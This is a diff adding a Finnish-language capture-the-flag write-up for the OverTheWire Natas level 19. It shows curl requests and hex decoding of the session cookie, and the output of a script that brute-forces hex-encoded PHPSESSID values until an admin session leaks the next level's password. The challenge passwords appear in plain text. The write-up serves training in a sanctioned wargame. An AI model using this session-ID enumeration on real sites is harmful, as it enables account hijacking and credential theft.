@@ -348,7 +348,188 @@ Sitten sivuston URL perään laitoin *?debnug* , koska jotta päästää siihen 
 Username: natas19 <br>
 Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
 
+Tämä on sama kuin aikaisepi taso eli 18, mutta **session ID:tä** ei ole saatavilla eli vaikeammaksi mennään. Ainakin tästä testattu yleis käyttäjätunnus ja salasanalla sisään (admin:admin) niin antoi uuden sivustson, jossa lukee näin:
 
+**This page uses mostly the same code as the previous level, but session IDs are no longer sequential... You are logged in as a regular user. Login as an admin to retrieve credentials for natas20.**
+
+Sama jouduttiin clear sitä evästettä, josta sitten päästään tähän kirjauttumisen etusivulle eli syötä *username;password*. Voi olla tämä konfiguroitu *view-source.html* sama kuin aikaisempi, mutta tässä tasossa ei annetta lisää vihjeitä kuitenkaan paitsi tämä (ylempi kuvaus)
+
+Myös sama testasin SQL injektiota, että ei antanut mitään vastausta, että tämä on vaikeampi ja koska PHPSESSID ei toistu peräkkäin. Siksi nyt tämä sulkee pois brutoe-force lähetymistavan.
+
+
+
+## Kali linux - testausta START HERE;
+
+```
+└─$ curl -I -H "Referer: http://natas20.natas.labs.overthewire.org/" -u "natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" http://natas19.natas.labs.overthewire.org/index-source.html
+```
+
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -I -H "Referer: http://natas20.natas.labs.overthewire.org/" -u "natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" http://natas19.natas.labs.overthewire.org/index-source.html
+HTTP/1.1 200 OK
+Date: Sat, 12 Jul 2025 16:30:55 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Last-Modified: Thu, 10 Apr 2025 14:18:42 GMT
+ETag: "45de-6326d434e830a"
+Accept-Ranges: bytes
+Content-Length: 17886
+Vary: Accept-Encoding
+Content-Type: text/html
+```
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -Headers "Referer: http://natas19.natas.labs.overthewire.org/" http://natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr@natas19.natas.labs.overthewire.org
+curl: (3) URL rejected: Malformed input to a URL function
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas19", "pass": "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" };</script></head>
+<body>
+<h1>natas19</h1>
+<div id="content">
+<p>
+<b>
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+</b>
+</p>
+
+<p>
+Please login with your admin account to retrieve credentials for natas20.
+</p>
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password"><br>
+<input type="submit" value="Login" />
+</form>
+</div>
+</body>
+</html>
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ echo -n "natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" | base64
+bmF0YXMxOTp0bndFUjdQZGZXa3hzRzRGTldVdG9BWjlWeVpUSnFKcg==
+                                                                                                                                                      
+┌──(kali㉿kali)-[~]
+└─$ curl 'http://natas19.natas.labs.overthewire.org/index.php' \
+  -H 'Authorization: Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==' \
+  -H 'Cookie: PHPSESSID=515' \
+  --insecure
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>401 Unauthorized</title>
+</head><body>
+<h1>Unauthorized</h1>
+<p>This server could not verify that you
+are authorized to access the document
+requested.  Either you supplied the wrong
+credentials (e.g., bad password), or your
+browser doesn't understand how to supply
+the credentials required.</p>
+<hr>
+<address>Apache/2.4.58 (Ubuntu) Server at natas19.natas.labs.overthewire.org Port 80</address>
+</body></html>
+```
+
+## Netistä tarkistellaan tietoa ja vihjeitä
+
+Otettin uusi yritys ainakin, josta username;password (admin) - niin antoi jonkinlaisen eväste luvun (cookies value) ja tarkistellaan mitä se luku oikein tarkoittakaan
+
+menin *username;password* : admin ja se eväste luku on: 3131392d61646d696e <br>
+Tästä luvusta muutettu **hex decodes on 119-admin**, kun joka kerta puhdistan/tyhjennän kirjauttuneen evästeen niin se luku muuttuu ja tarkistuksena tarkistettu se alku lukukin on eri.
+
+**Tämä tarkoittaa dekoodaa hexmerkkijonon tekstiksi**:
+```
+┌──(kali㉿kali)-[~]
+└─$ echo -n 3131392d61646d696e | xxd -r -p                             
+119-admin                                                                                                                                                      
+┌──(kali㉿kali)-[~]
+└─$ echo -n 39342d61646d696e | xxd -r -p
+94-admin                                                                                                                                                                   
+```
+
+Periaatteessa nyt pitää selvittää tämä <VALUE>-admin mikä onkaan. Nyt ideana on selvittää PHPSESSID luku, jotta saadaan selvitettyä Natas20 salasansa. Periaatteessa sama tarkoittava, mutta vain dekoodattu dataa.
+
+### Brute force START NOW;
+
+Jossakin ohjeessa lisätään parametriä siihen, että se tekee sen satunnaisen ja suorittaa luvut järjestyksessä, kuin aikaisempi harjoitus natas 18 (menee PHPSESSID 1:stä 640 asti), mutta nyt halutaan selvittää se evästeen luku ja alkaen kuin 1 dekoodattuna eli **<value>-admin**. Tässäkin harjoituksessa menee sama Python koodilla, mutta vain lisätty pientä ominaisuutta sisään.
+
+```
+┌──(kali㉿kali)-[~/Desktop/Python koodit]
+└─$ python pythonkoodi19.py 
+PHPSESSID=312d61646d696e
+PHPSESSID=322d61646d696e
+PHPSESSID=332d61646d696e
+PHPSESSID=342d61646d696e
+PHPSESSID=352d61646d696e
+PHPSESSID=362d61646d696e
+PHPSESSID=372d61646d696e
+PHPSESSID=382d61646d696e
+PHPSESSID=392d61646d696e
+PHPSESSID=31302d61646d696e
+PHPSESSID=31312d61646d696e
+PHPSESSID=31322d61646d696e
+..........
+
+
+PHPSESSID=3237392d61646d696e
+PHPSESSID=3238302d61646d696e
+PHPSESSID=3238312d61646d696e
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas19", "pass": "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" };</script></head>
+<body>
+<h1>natas19</h1>
+<div id="content">
+<p>
+<b>
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+</b>
+</p>
+DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas20
+Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw</pre></div>
+</body>
+</html>
+
+PHPSESSID=3238322d61646d696e
+PHPSESSID=3238332d61646d696e
+PHPSESSID=3238342d61646d696e
+............
+
+PHPSESSID=3633352d61646d696e
+PHPSESSID=3633362d61646d696e
+PHPSESSID=3633372d61646d696e
+PHPSESSID=3633382d61646d696e
+PHPSESSID=3633392d61646d696e
+PHPSESSID=3634302d61646d696e
+Done!
+```
+
+
+Jos tarkistellaan toi luku "3238312d61646d696e" varmuuden vuoksi:
+```
+┌──(kali㉿kali)-[~]
+└─$ echo -n 3238312d61646d696e | xxd -r -p
+281-admin 
+```
 
 
 
